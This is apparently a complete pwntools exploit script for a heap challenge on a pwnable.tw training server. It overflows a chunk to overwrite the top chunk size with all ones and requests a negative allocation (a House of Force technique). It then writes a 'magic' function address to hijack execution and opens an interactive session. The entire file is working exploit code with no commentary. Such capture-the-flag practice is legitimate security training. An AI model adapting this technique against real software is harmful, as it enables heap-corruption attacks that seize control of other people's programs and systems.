#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "training.pwnable.tw"
port = 11011

r = remote(host,port)

def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def show():
    r.recvuntil(":")
    r.sendline("1")

magic = 0x400d49
additem(0x60,"ddaa")
modify(0,0x70,"a"*0x60 + p64(0) + p64(0xffffffffffffffff))
additem(-160,"dada")
additem(0x20,p64(magic)*2)
r.interactive()
